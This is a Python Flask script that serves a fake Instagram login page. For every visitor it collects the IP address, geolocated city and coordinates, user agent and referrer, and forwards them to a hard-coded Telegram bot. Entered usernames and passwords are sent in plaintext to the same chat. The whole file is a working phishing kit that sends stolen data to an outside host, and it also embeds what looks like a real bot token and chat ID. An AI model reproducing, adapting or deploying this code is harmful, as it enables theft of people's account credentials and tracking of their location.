from flask import Flask, request, redirect, url_for, render_template_string, flash
import telebot
import requests
from ip2geotools.databases.noncommercial import DbIpCity

app = Flask(__name__)
app.secret_key = 'secret123'  # Needed for flashing messages

# Telegram Bot Configuration
BOT_TOKEN = '8096386157:AAEkHHt2QYnB_s83puOfrl2xPZZ1FKtVqDw'
ADMIN_CHAT_ID = '6420116837'
bot = telebot.TeleBot(BOT_TOKEN)

# Dummy credentials for login check
VALID_USERNAME = "admin"
VALID_PASSWORD = "admin123"

# Function to get user details
def get_user_details(ip):
    try:
        if ip == '127.0.0.1':
            ip = requests.get('https://api.ipify.org').text
        
        response = DbIpCity.get(ip, api_key='free')
        city = response.city
        country = response.country
        region = response.region
        latitude = response.latitude
        longitude = response.longitude
        return {
            'ip': ip,
            'city': city,
            'country': country,
            'region': region,
            'coordinates': f"{latitude}, {longitude}"
        }
    except:
        return {
            'ip': ip,
            'city': 'Unknown',
            'country': 'Unknown',
            'region': 'Unknown',
            'coordinates': 'Unknown'
        }

# Function to send message to Telegram
def send_telegram_message(message):
    try:
        bot.send_message(ADMIN_CHAT_ID, message)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# --- HTML + CSS Template ---
login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px 40px;
            width: 350px;
            text-align: center;
        }

        .login-container h1 {
            font-family: 'Billabong', cursive;
            font-size: 48px;
            margin-bottom: 30px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 6px 0;
            box-sizing: border-box;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
        }

        button {
            width: 100%;
            background-color: #3897f0;
            color: white;
            padding: 10px;
            border: none;
            margin-top: 10px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }

        .or {
            margin: 20px 0;
            color: #999;
            font-weight: bold;
        }

        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup {
            margin-top: 20px;
            font-size: 14px;
        }

        .signup a {
            color: #3897f0;
            font-weight: bold;
            text-decoration: none;
        }

        .flash {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>

        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <div class="flash">{{ messages[0] }}</div>
          {% endif %}
        {% endwith %}

        <form method="POST" action="/">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>

        <div class="or">OR</div>

        <a class="forgot" href="#">Forgot password?</a>

        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>
"""

# --- Flask Routes ---
@app.route("/", methods=["GET", "POST"])
def login():
    # Get user IP and details
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.headers.get('Referer', 'Direct access')
    
    # Get location details
    user_details = get_user_details(user_ip)
    
    # Send initial access info to Telegram
    access_message = f"""
🚨 New Page Access 🚨
    
📌 IP: {user_details['ip']}
🌍 Location: {user_details['city']}, {user_details['region']}, {user_details['country']}
📍 Coordinates: {user_details['coordinates']}
    
🖥️ User Agent: {user_agent}
🔗 Referrer: {referrer}
"""
    send_telegram_message(access_message)

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Send login attempt to Telegram
        login_message = f"""
🔐 Login Attempt 🔐
    
👤 Username: {username}
🔑 Password: {password}
    
📌 IP: {user_details['ip']}
🌍 Location: {user_details['city']}, {user_details['region']}, {user_details['country']}
📍 Coordinates: {user_details['coordinates']}
    
🖥️ User Agent: {user_agent}
"""
        send_telegram_message(login_message)

        if username == VALID_USERNAME and password == VALID_PASSWORD:
            return f"<h2 style='text-align:center;'>Welcome, {username} 🎉</h2>"
        else:
            flash("Invalid username or password")

    return render_template_string(login_page)

# --- Run Server ---
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
